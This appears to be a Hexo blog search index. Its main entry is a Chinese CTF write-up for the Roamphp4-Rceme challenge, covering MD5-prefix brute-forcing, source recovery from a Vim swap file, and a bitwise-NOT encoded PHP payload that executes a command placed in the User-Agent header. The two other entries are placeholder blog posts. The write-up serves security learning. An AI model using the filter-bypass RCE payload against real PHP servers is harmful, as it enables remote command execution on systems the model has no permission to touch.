<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[极客大挑战 2020]Roamphp4-Rceme WP</title>
      <link href="/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/"/>
      <url>/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战-2020-Roamphp4-Rceme"><a href="#极客大挑战-2020-Roamphp4-Rceme" class="headerlink" title="[极客大挑战 2020]Roamphp4-Rceme"></a>[极客大挑战 2020]Roamphp4-Rceme</h1><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042050251.png" alt="img"></p><p>进入题目，可以看到，大概意思就是如果code的md5值前5位是3e16b，那么就会执行命令</p><p>这边给出一个md5生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&#x27;0e788&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>查看源码，发现提示</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051889.png" alt="img"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">vim swp，.swp文件是vim使用不当而生成的一个文件，这种文件一般都是“坏的”，查看原来内容需要vim -r</span><br><span class="line">要直接用 Vim 打开一个 .swp 文件，你可以采取以下步骤。一般情况下，.swp 文件是二进制文件，直接编辑它并不常见，但你可能会希望查看其内容。</span><br><span class="line"></span><br><span class="line">1. 打开 .swp 文件</span><br><span class="line">你可以用 vim 命令直接打开 .swp 文件。例如：</span><br><span class="line">vim example.txt.swp</span><br><span class="line"></span><br><span class="line">2. 使用 :recover 命令恢复文件</span><br><span class="line">如果你的目的是从交换文件中恢复数据，可以使用 :recover 命令。假设你有一个交换文件 example.txt.swp，你可以这样做：</span><br><span class="line">vim -r example.txt</span><br><span class="line"></span><br><span class="line">3. 手动打开 .swp 文件查看内容</span><br><span class="line">如果你只想查看 .swp 文件的内容，尽管它是二进制文件，你可以使用 Vim 的二进制模式来查看。注意，这不是常见操作，而且通常不会有很好的阅读体验，但可以帮助你检查交换文件的一些细节。步骤如下：</span><br><span class="line">vim -b example.txt.swp</span><br><span class="line"></span><br><span class="line">在 Vim 中，使用以下命令可以切换到十六进制模式，这样你可以更方便地查看二进制内容：</span><br><span class="line">:%!xxd</span><br><span class="line"></span><br><span class="line">要返回普通模式，可以使用：</span><br><span class="line">:%!xxd -r</span><br><span class="line"></span><br><span class="line">4. 使用 xxd 查看 .swp 文件</span><br><span class="line">你也可以使用 xxd 命令来查看 .swp 文件的内容：</span><br><span class="line">xxd example.txt.swp | less</span><br><span class="line">这会将 .swp 文件转换为十六进制显示，便于查看。</span><br><span class="line"></span><br><span class="line">5. 确定如何处理 .swp 文件</span><br><span class="line">大多数情况下，你需要根据 Vim 的提示来决定如何处理 .swp 文件。例如，当你尝试打开一个文件时，Vim 会提示交换文件已经存在，并给出几种处理选项：</span><br><span class="line"></span><br><span class="line">O: 只读打开文件。</span><br><span class="line">E: 继续编辑文件，忽略交换文件。</span><br><span class="line">R: 恢复文件，尝试从交换文件中恢复数据。</span><br><span class="line">D: 删除交换文件，通常在确认没有其他 Vim 实例在编辑该文件时使用。</span><br><span class="line">Q: 退出，不进行任何操作。</span><br><span class="line">A: 中止操作，类似于退出。</span><br><span class="line">选择适当的选项，处理交换文件后再继续编辑主文件。</span><br><span class="line"></span><br><span class="line">通过这些方法，你可以用 Vim 打开和查看 .swp 文件。要特别注意的是，.swp 文件主要用于 Vim 的数据恢复，所以一般不建议直接编辑它们，而是通过恢复和处理的方式进行操作。</span><br></pre></td></tr></table></figure><p>然后，我们直接访问&#x2F;.index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053910.png" alt="img"></p><p>在kali中打开 vim -r index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051195.png" alt="img"></p><p>源码如上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">substr(md5(mt_rand() . sha1(mt_rand())), 0, 5) 是一段 PHP 代码，用于生成一个长度为 5 的随机字符串。下面是这段代码的具体解析：</span><br><span class="line"></span><br><span class="line">mt_rand():</span><br><span class="line"></span><br><span class="line">mt_rand() 是一个生成随机整数的函数，基于 Mersenne Twister 算法，比 rand() 更快并且提供更高的随机性。</span><br><span class="line">该函数会返回一个介于 0 和 RAND_MAX 之间的随机整数。</span><br><span class="line">sha1(mt_rand()):</span><br><span class="line"></span><br><span class="line">生成一个随机整数，然后计算其 SHA-1 哈希值。</span><br><span class="line">SHA-1 哈希值是一个 40 字符的十六进制字符串。</span><br><span class="line">连接随机值和 SHA-1 哈希值:</span><br><span class="line"></span><br><span class="line">mt_rand() . sha1(mt_rand()) 生成两个随机整数，并将它们的值连接起来。</span><br><span class="line">md5():</span><br><span class="line"></span><br><span class="line">对连接后的字符串计算其 MD5 哈希值。</span><br><span class="line">MD5 哈希值是一个 32 字符的十六进制字符串。</span><br><span class="line">substr():</span><br><span class="line"></span><br><span class="line">从生成的 MD5 哈希值中提取前 5 个字符。</span><br><span class="line">组合起来，代码的具体执行顺序如下：</span><br><span class="line"></span><br><span class="line">调用 mt_rand() 生成一个随机整数。</span><br><span class="line">调用 sha1() 生成另一个随机整数的 SHA-1 哈希值。</span><br><span class="line">将这两个值连接起来形成一个字符串。</span><br><span class="line">计算这个字符串的 MD5 哈希值。</span><br><span class="line">从 MD5 哈希值中提取前 5 个字符。</span><br><span class="line">因此，代码的作用是生成一个相对随机的 5 字符长的字符串</span><br></pre></td></tr></table></figure><p>可以看到进行了长度限制和过滤，并且那个md5值也在变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">前置知识：</span><br><span class="line"></span><br><span class="line">(<span class="string">&#x27;phpinfo&#x27;</span>)()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>][<span class="number">0</span>]()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>]&#123;<span class="number">0</span>&#125;()</span><br><span class="line">效果作用是一样的。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(): [~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>][~%CF]();</span><br><span class="line">加这个[~%FF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF] [~%CF]</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>() 获取所有 HTTP 头信息，返回一个关联数组。</span><br><span class="line"><span class="title function_ invoke__">next</span>() 试图将数组的内部指针移动到下一个元素，并返回该元素的值。</span><br><span class="line"></span><br><span class="line">假设 HTTP 头包含以下信息：</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [Host] =&gt; example.com</span><br><span class="line">    [User-Agent] =&gt; Mozilla/<span class="number">5.0</span></span><br><span class="line">    [Accept] =&gt; text/html</span><br><span class="line">    [Connection] =&gt; keep-alive</span><br><span class="line">)</span><br><span class="line">当你执行 <span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()) 时：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="title function_ invoke__">getallheaders</span>(); <span class="comment">// 获取所有 HTTP 头信息</span></span><br><span class="line"><span class="variable">$nextHeader</span> = <span class="title function_ invoke__">next</span>(<span class="variable">$headers</span>); <span class="comment">// 将指针移动到下一个元素，并返回该元素的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nextHeader</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在这个示例中，<span class="variable">$nextHeader</span> 将包含 Mozilla/<span class="number">5.0</span>，因为这是数组中的第二个元素。</span><br></pre></td></tr></table></figure><p>因为UA是可控的，所以一般在UA进行RCE</p><p>然后，我们抓包看一下</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052054.png" alt="img"></p><p>在第二位，所以构造语句拿到http头，并且执行在UA中的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即：<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure><p>然后，进行取反绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052657.png" alt="img"></p><p>查看效果</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053275.png" alt="img"></p><p>然后，直接cat &#x2F;flll1114gggggg</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053789.png" alt="img"></p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>article title</title>
      <link href="/2024/06/02/article-title/"/>
      <url>/2024/06/02/article-title/</url>
      
        <content type="html"><![CDATA[<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406011811697.jpg" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -这是一个测试 -文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/06/02/hello-world/"/>
      <url>/2024/06/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
